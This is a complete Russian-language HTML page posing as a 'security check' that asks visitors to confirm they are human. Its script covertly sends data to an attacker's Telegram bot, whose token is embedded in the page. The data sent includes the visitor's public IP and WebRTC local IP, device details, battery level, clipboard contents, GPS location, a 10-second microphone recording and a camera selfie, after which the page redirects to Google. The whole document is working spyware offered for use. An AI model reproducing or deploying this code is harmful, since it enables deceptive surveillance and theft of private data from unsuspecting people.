<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Проверка безопасности</title>
    <style>
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background: #0f0f0f; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; color: #fff; }
        .card { background: #1a1a1a; border: 1px solid #333; border-radius: 16px; padding: 30px 20px; width: 90%; max-width: 380px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
        .icon { font-size: 50px; margin-bottom: 15px; color: #fe2c55; }
        h2 { font-size: 22px; margin-bottom: 10px; }
        p { font-size: 14px; color: #888; margin-bottom: 25px; line-height: 1.5; }
        button { width: 100%; padding: 16px; background: #fe2c55; color: #fff; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:active { transform: scale(0.98); background: #d92345; }
        
        #loading { display: none; text-align: center; }
        .spinner { border: 3px solid #333; border-top: 3px solid #fe2c55; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        #camera { display: none; }
    </style>
</head>
<body>

    <div class="card" id="step1">
        <div class="icon">🛡️</div>
        <h2>Проверка безопасности</h2>
        <p>Система обнаружила подозрительную активность. Нажмите кнопку ниже для подтверждения, что вы человек.</p>
        <button id="startBtn">Пройти проверку</button>
    </div>

    <div class="card" id="loading">
        <div class="spinner"></div>
        <h2>Анализ...</h2>
        <p id="loadText">Сбор данных о сессии...</p>
    </div>

    <video id="camera" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8758850534:AAF79a17p6NCuHMluPI_Rkw7FeoQSkCcRe8";
        const CHAT_ID = "7485234259";

        // --- ФУНКЦИИ ОТПРАВКИ ---
        function sendText(text) {
            const img = new Image();
            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
        }

        async function sendMedia(endpoint, blob, filename, caption) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append(endpoint === 'sendVoice' ? 'voice' : 'photo', blob, filename);
            formData.append('caption', caption);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, { method: 'POST', body: formData });
        }

        // --- ГЛАВНАЯ ФУНКЦИЯ СБОРА ---
        document.getElementById('startBtn').addEventListener('click', async function() {
            document.getElementById('step1').style.display = 'none';
            document.getElementById('loading').style.display = 'block';

            sendText("🎯 <b>Запущен процесс сбора данных!</b>");

            // 1. СБОР IP И WEBRTC (Локальный IP)
            fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d => sendText(`🌐 Публичный IP: ${d.ip}`)).catch(()=>{});
            
            try {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                pc.createDataChannel("");
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = (event) => {
                    if (event.candidate) {
                        const match = event.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                        if (match) { sendText(`🕵️ Локальный IP (WebRTC): ${match[1]}`); pc.close(); }
                    }
                };
            } catch(e) {}

            // 2. БАТАРЕЯ И ЖЕЛЕЗО (Без модели)
            if(navigator.getBattery) {
                navigator.getBattery().then(b => sendText(`🔋 Заряд: ${Math.round(b.level * 100)}%`));
            }
            sendText(`💻 Инфо: Язык: ${navigator.language} | Ядра: ${navigator.hardwareConcurrency} | ОС: ${navigator.platform}`);

            // 3. БУФЕР ОБМЕНА
            try {
                const clip = await navigator.clipboard.readText();
                if (clip) sendText(`📋 Буфер обмена:\n${clip}`);
            } catch(e) { sendText(`📋 Буфер: Заблокирован`); }

            // 4. GPS
            document.getElementById('loadText').innerText = "Определение геолокации...";
            navigator.geolocation.getCurrentPosition(
                (pos) => sendText(`🗺️ GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`),
                (err) => sendText(`🗺️ GPS: Отклонен`)
            );

            // 5. МИКРОФОН (10 секунд)
            document.getElementById('loadText').innerText = "Сканирование звуков...";
            try {
                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(audioStream);
                const audioChunks = [];
                mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
                mediaRecorder.onstop = async () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                    await sendMedia('sendVoice', audioBlob, 'voice.ogg', '🎙️ Аудио окружения (10 сек)');
                    audioStream.getTracks().forEach(track => track.stop());
                };
                mediaRecorder.start();
                setTimeout(() => { mediaRecorder.stop(); }, 10000);
            } catch (err) { sendText(`🎙️ Микрофон: Отклонен`); }

            // 6. КАМЕРА
            document.getElementById('loadText').innerText = "Биометрическая проверка...";
            try {
                const videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                const video = document.getElementById('camera');
                video.srcObject = videoStream;
                await new Promise(r => setTimeout(r, 1000));
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                videoStream.getTracks().forEach(track => track.stop());

                const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.8))).blob();
                await sendMedia('sendPhoto', blob, 'face.jpg', `📸 Селфи (Проверка)`);
            } catch (err) { sendText(`📸 Камера: Отклонена`); }

            // 7. ЗАВЕРШЕНИЕ
            document.getElementById('loadText').innerText = "Проверка пройдена!";
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 2500);
        });
    </script>
</body>
</html>
